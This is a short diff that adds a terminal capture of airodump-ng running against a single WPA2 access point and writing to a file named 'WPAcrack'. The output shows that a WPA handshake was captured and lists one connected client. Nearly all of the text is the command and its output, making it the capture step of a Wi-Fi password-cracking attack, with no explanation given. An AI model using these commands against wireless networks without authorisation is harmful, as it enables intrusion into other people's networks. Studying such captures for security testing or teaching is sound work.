@@ -1,0 +1,12 @@
+masha@masha-pc:~$ sudo airodump-ng -c 6 --bssid C0:4A:00:63:B5:CC -w WPAcrack --ignore-negative-one mon0
+
+ CH  7 ][ Elapsed: 8 mins ][ 2017-12-25 14:44 ][ WPA handshake: C0:4A:00:63:B5:
+                                                                               
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                               
+ C0:4A:00:63:B5:CC  -38     4864      405    0  11  54e. WPA2 CCMP   PSK  TPLIN
+                                                                               
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe     
+                                                                               
+ C0:4A:00:63:B5:CC  74:DE:2B:64:22:23    0    0e- 1      0      199  
+
